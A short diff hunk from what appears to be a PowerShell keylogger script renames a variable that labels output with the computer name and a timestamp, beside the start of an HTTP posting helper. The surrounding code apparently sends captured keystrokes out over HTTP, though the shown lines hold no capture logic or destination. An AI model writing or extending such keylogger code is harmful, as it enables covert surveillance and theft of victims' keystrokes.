@@ -262,7 +262,7 @@ function script:Keylogger
             }
             $now = Get-Date; 
             $name = $env:COMPUTERNAME 
-            $paste_name = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
+            $pastename = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
             function post_http($url,$parameters) 
             { 
                 $http_request = New-Object -ComObject Msxml2.XMLHTTP 
